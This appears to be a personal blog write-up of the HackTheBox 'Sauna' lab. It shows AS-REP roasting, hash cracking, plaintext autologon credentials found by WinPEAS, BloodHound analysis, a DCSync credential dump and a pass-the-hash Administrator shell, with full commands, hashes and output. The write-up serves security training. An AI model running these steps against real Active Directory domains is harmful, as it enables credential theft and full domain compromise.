---
title: HTB -- Sauna
date: 2022-01-20
layout: single
header:
  teaser: assets/images/htb/sauna/teaser.png
excerpt: Another great AD box instructive for AS_REP roasting and light Bloodhound work to discover a possible DCSync attack.
classes: wide
categories:
  - hackthebox
tags:
  - hackthebox
  - OSCP
  - kerberos
  - ad
---

# Summary
![](/assets/images/htb/sauna/teaser.png)

This box is a must for learning to attack AD. Offering a foothold through web osint, you practice AS_REP roasting for a foothold. From there Bloodhound leads to further enumeration leading to a DCSync attack for root.

### NMAP
```
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-04 18:58 EST
Nmap scan report for sauna.htb (10.10.10.175)
Host is up (0.016s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

## Web
![](/assets/images/htb/sauna/web-index.png)

* Directory Brute Force
  * `feroxbuster -u http://sauna.htb`
  * Standard web looking results, images, fonts dir etc.
* Subdomain Search
  * `ffuf -w ~/HTB/subdomains-top1million-110000.txt -u http://10.10.10.175 -H "Host: FUZZ.sauna.htb"`
  * No results
* Active Directory Box -> Note Usernames
  * username brute forcing is a common mechanism
  * the about page [http://sauna.htb/about.html](http://sauna.htb/about.html)
    * Lists 6 employees, write these down!

## AD Enumeration

* `enum4linux sauna.htb`
  * Domain Name: EGOTISTICALBANK\
    Domain Sid: S-1-5-21-2966785786-3096785034-1186376766
* `smbmap`
  * Anonymous login is allowed, but getting errors on shares
* Kerberos
  * Since we have usernames to try, we can look into brute forcing with kerbrute

### Kerbrute

Kerbrute will attempt to grab hashes when pre auth is diabled. Here you can either use a list of guessed usernames from the ones found on the website earlier, or use a common username list from SecLists.

```
go run main.go userenum -d EGOTISTICAL-BANK.LOCAL /opt/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
...
2021/12/19 11:27:28 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
2021/12/19 11:28:00 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
2021/12/19 11:28:06 >  [+] VALID USERNAME:       Administrator@EGOTISTICAL-BANK.LOCAL
2021/12/19 11:28:24 >  [+] fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:408d0b220e7536e0e7e595bcdb91a39f$62ca3b17bfc8497effbbcb4d365542e5727f625902ac09cffe4874a667826263247c47ad5e299298d436a305d576549f34fbe6b47e2514d40c48da046a3c19e57c331c81c30b1f9ecb0e3585bd53a81209087fea501e05816b595e001a253bff3a63eb947b7379f4ffb21acc55222162d07c1496b54b72be37dd3068470f617f29edd92d6bd4720d2470105af2cd7bbec3204c7aa1043118be5f0e4cecbe6bc5cbeb402396119299fa9797e5d4d8f4a5ad65d91ca2667aceb9cbdcf567ba776d1d900d709cd14dada18bac692c5fed50e6693e2816a4d48866a6d4b948386e3224b34a79a80faf760d2f47466dc888bf02c94b1a76727789f1c439c359ce135cda8e3684cbe4578bbe5fd4a29d0ef79676554f54a2ba
2021/12/19 11:28:24 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
```

Sure enough, we grab the hash of `fsmith` and save it to a file

### Impacket

The same concept can also be executed with impacket

```
 python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile ~/HTB/sauna/users.txt -dc-ip 10.10.10.175
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:fc325c7eed013e9bd83a39651ec53c93$a51ac193a10ac40fd4f6fb2d1b95ab83f77dddc427c50612a0319f2dfef658771ffc8508d667b5766f7edab7b8301d3e67e963f2a62d204f24fa08d37c5c2138e1a8d748959799640ae5e7591c6ccc4fea39d50c73382dd84bbffad82267c8d200cb684b88f505d746c2009c32c1b62de0a6e61fa68cb50b1ba9c91b2bb6328aad3c377254c6ee21f5cc7492d2e1113b141677cefe2008128445b439d86f843e46d39163e672ff2b38d522f0fc911130412ef4dce4abba69cfa05f4ac8be71ac3644b3061f20e9b97189a00ac57a8c9a5723d3b922895d71bdfe9292502f10986cfae3833cfff64fd9c111cbda29f3f66ede8dfe358a9e6c0ab2d7940d8517c5
[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
                                                                                              
```

### Cracking the hash

Can either use hashcat or john to crack the hash. Shown below is the respective commands for hashcat and john.

```
hashcat -a 0 -m 18200 --force '$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5a9dc70d4287c85271158ed6156a7ac5$b5099cac5c55a157d030073977bbcf11580a45a24f06111f57d3f423ac80cae6f1410a84e3136f1d9bd9f1a91c7cc011b547e2ae8c33f78b97e56efb236b9a1987ccbecfb8afb44b5cf74d05a4ce65447033254b5e3701c10c85e70ead501530702dc99e1259a3a15a470654ea61e32c68f01d11d35dcc78dd64264592f74ec14535c1826238395a8fd4ccdc5ff69f2034cbcc1b652231fdfc84431ab184306b9df72e6c492b7baf49eb8df5814a33c7d654be7af4c6d8ac8c60a680cded2810015e56e6b4283f483c11d226ddf3ca1d90ad10a011573574f7c2940834728f49e0808bdd3818e2e68efdfcc6b2593d30ad2e79e4fb0d0e2bcab40d6858c084b8' ~/rockyou.txt
```

```
john roasted.txt --wordlist=~/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
1g 0:00:00:08 DONE (2022-01-04 20:49) 0.1184g/s 1248Kp/s 1248Kc/s 1248KC/s Thrall..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
```

## User Privesc

We can grab a shell with our previously learned creds and a copy of evilwinrm

```
evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
```

### Winpeas -> creds

```
...
rpcdriver
svcaccount
 Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

EGOTISTICALBANK
```

Awesome, plaintext creds from autologin, there is one more trick that caught me for a while. The username is actually different than the autologin name

```
***Evil-WinRM* PS C:\Users\FSmith\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.
**
```

We need to login as `svc_loanmgr` and not `svc_loanmanager`, tricky

```
ruby ~/evil-winrm/evil-winrm.rb -i 10.10.10.175 -u svc_loanmgr -p Moneymakestheworldgoround!
```

## Bloodhound

First, we need to generate data to ingest. There are various methods available, my dataset was generated from Sharphound.

```
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> upload /home/kali/HTB/forest/SharpHound.exe
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> ./SharpHound.exe                                                                             
-----------------------------------------------                                                                                              
Initializing SharpHound at 12:49 AM on 1/7/2022                                                                                              
-----------------------------------------------                                                                                              
                                                                      
Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
                                                                      
[+] Creating Schema map for domain EGOTISTICAL-BANK.LOCAL using path CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS                                                                                                    
Status: 0 objects finished (+0) -- Using 19 MB RAM                                                                                           
Status: 60 objects finished (+60 ì)/s -- Using 27 MB RAM
Enumeration finished in 00:00:00.3619432                      
Compressing data to .\20220107004919_BloodHound.zip
You can upload this file directly to the UI
                                                                                                                                             
SharpHound Enumeration Completed at 12:49 AM on 1/7/2022! Happy Graphing!

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> dir


    Directory: C:\Users\svc_loanmgr\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         1/7/2022  12:49 AM           9107 20220107004919_BloodHound.zip
-a----         1/7/2022  12:48 AM         833024 SharpHound.exe
-a----         1/7/2022  12:49 AM          11122 ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin


*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> download 20220107004919_BloodHound.zip

```

Once we have our data, throw it into Bloodhound.

From writeups and watching ippsec the general idea is as follows

* Mark users as owned
* Start clicking different queries under `Analysis`
* Once you find one that you don't get
  * right click -> help

First up, mark users `fsmith` and `svc_loanmgr` as owned

![](/assets/images/htb/sauna/bloodhound-3.png)

Next, we want to iterate through common queries to find interesting connections from an owned user to administrator, or other lateral movement. Some of these queries explicitly spell out the name of an attack as well, which is nice if you know what you are looking for.

![](/assets/images/htb/sauna/bloodhound-1.png){: .align-right}

For this case, the third item -- `Find Principals with DCSync Rights` jumped out, showing the connection `svc_loanmgr` to the domain via `GetChanges + GetchangesAll`. Since we searched for Principals with DCSync rights, we know a DCsync attack will work for DA access.

![](/assets/images/htb/sauna/bloodhound-2.png)

## DCSync

There are a few ways to perform a DCSync attack, but the easiest seems to be impackets `secretsdump.py`

```
sudo secretsdump.py egotistical-bank.local/svc_loanmgr@10.10.10.175
[sudo] password for kali: 
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:4832fa8fafb16b2ebd7e1c8720f86b01:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:0aaccd166cc3ed6ee4b1242f534ecddee489242221ff3124bd9607f1d3de0f32
SAUNA$:aes128-cts-hmac-sha1-96:0ab5a6a36480831aaeec43603a6a1971
SAUNA$:des-cbc-md5:f19def378f312cfe
[*] Cleaning up...                 
```

And it works! We have an admin hash  which can be turned into a shell with a pass the hash attack. Copy the last bit of the admin hash

`Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::`

```
ruby ~/evil-winrm/evil-winrm.rb -i 10.10.10.175 --hash 823452073d75b9d1cf70ebdf86c7f98e -u Administrator        1 ⨯

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
egotisticalbank\administrator
```

And we have root!


## Other Walkthroughs
[IPPSec does a great job of explaining bloodhound](https://www.youtube.com/watch?v=uLNpR3AnE-Y)

[0xdf writeup](https://0xdf.gitlab.io/2020/07/18/htb-sauna.html)

